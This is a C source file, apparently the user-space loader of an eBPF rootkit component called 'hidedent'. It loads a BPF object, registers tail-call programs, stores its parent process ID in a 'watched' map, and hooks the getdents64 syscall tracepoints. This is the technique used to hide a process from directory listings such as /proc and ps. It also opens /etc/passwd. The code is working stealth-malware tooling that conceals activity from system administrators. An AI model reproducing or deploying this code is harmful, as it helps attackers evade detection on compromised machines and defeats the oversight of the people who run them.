#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "hidedent.h"

static int stop = 0;

static inline int insert_pid_into_watched_map(struct bpf_map *watched_pid_map)
{
	int key = 0;
	size_t pid = getppid();
	struct pid_str str;
	snprintf(str.pid_string, MAX_PID_STR_LEN, "%ld", pid);
	str.pid_string_len = strlen(str.pid_string);

	printf("insert pid into map: %lu\n", pid);
	return bpf_map__update_elem(watched_pid_map, (const void *)&key,
				    sizeof(key), (void *)&str, sizeof(str), 0);
}

static inline struct bpf_link *find_and_attach_prog(struct bpf_object *object,
						    const char *prog_name,
						    const char *tp_cat,
						    const char *tp_name)
{
	struct bpf_program *prog =
	    bpf_object__find_program_by_name(object, prog_name);
	if (!prog)
		return NULL;

	return bpf_program__attach_tracepoint(prog, tp_cat, tp_name);
}

static inline int
find_and_insert_prog_to_tail_call_map(struct bpf_object *object,
				      const char *prog_name,
				      struct bpf_map *prog_map, int idx)
{
	struct bpf_program *prog =
	    bpf_object__find_program_by_name(object, prog_name);
	if (!prog)
		return -errno;

	int prog_fd = bpf_program__fd(prog);
	return bpf_map__update_elem(prog_map, (const void *)&idx, sizeof(idx),
				    (void *)&prog_fd, sizeof(prog_fd), 0);
}

void sig_handler(int signum) { stop = 1; }

int main(int argc, char **argv)
{
	int ret = 0, fd = 0;
	struct bpf_object *obj = NULL;
	struct bpf_map *prog_map = NULL, *watched_pid_map = NULL;
	struct bpf_link *link = NULL;

	obj = bpf_object__open_file("./hidedent.bpf.o", NULL);
	if (!obj) {
		printf("Failed to open BPF object file: %d\n", -errno);
		return -errno;
	}

	ret = bpf_object__load(obj);
	if (ret) {
		printf("Failed to load BPF object file: %d\n", ret);
		goto EXIT_ERR;
	}

	prog_map = bpf_object__find_map_by_name(obj, "map_prog_fd");
	if (!prog_map) {
		printf(
		    "Make sure map_prog_fd map is in the BPF object file: %d\n",
		    -errno);
		goto EXIT_ERR;
	}

	watched_pid_map = bpf_object__find_map_by_name(obj, "map_watched_pid");
	if (!prog_map) {
		printf("Make sure map_watched_pid map is in the BPF object "
		       "file: %d\n",
		       -errno);
		goto EXIT_ERR;
	}

	find_and_insert_prog_to_tail_call_map(obj, "handle_getdents_patch",
					      prog_map, patch_prog_idx);
	if (ret) {
		printf("Failed to insert program for BPF tail call : %d\n",
		       ret);
		goto EXIT_ERR;
	}
	find_and_insert_prog_to_tail_call_map(obj, "handle_exit_getdents64",
					      prog_map, exit_prog_idx);
	if (ret) {
		printf("Failed to insert program for BPF tail call : %d\n",
		       ret);
		goto EXIT_ERR;
	}

	ret = insert_pid_into_watched_map(watched_pid_map);
	if (ret) {
		printf("Failed to insert program PID into map : %d\n", ret);
		goto EXIT_ERR;
	}

	link = find_and_attach_prog(obj, "handle_enter_getdents64", "syscalls",
				    "sys_enter_getdents64");
	if (!link) {
		printf("Failed to attach handle_enter_getdents64 \n");
		goto EXIT_ERR;
	}

	link = find_and_attach_prog(obj, "handle_exit_getdents64", "syscalls",
				    "sys_exit_getdents64");
	if (!link) {
		printf("Failed to attach handle_exit_getdents64 \n");
		goto EXIT_ERR;
	}

	fd = open("/etc/passwd", O_RDONLY);
	if (fd < 0) {
		printf("Failed to open /etc/passwd...\n");
		goto EXIT_ERR;
	}

	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

	while (!stop) {
		sleep(1);
	}
	close(fd);
	return 0;

EXIT_ERR:
	int err = -errno;
	bpf_object__close(obj);
	return err;
}
